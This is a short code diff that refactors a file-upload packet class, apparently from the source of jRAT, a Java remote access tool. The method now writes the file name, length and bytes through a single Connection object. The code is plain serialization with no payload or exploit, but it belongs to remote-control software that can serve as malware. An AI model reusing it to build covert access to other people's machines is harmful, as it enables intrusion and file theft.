@@ -1,7 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 
 public class Packet29ClientUploadPart extends AbstractOutgoingPacket {
@@ -17,11 +16,11 @@ public class Packet29ClientUploadPart extends AbstractOutgoingPacket {
 	}
 	
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(file);
+	public void write(Connection con) throws Exception {
+        con.writeLine(file);
 
-		dos.writeInt(to);
-		dos.write(part, 0, to);
+        con.writeInt(to);
+        con.write(part, 0, to);
 	}
 
 	@Override
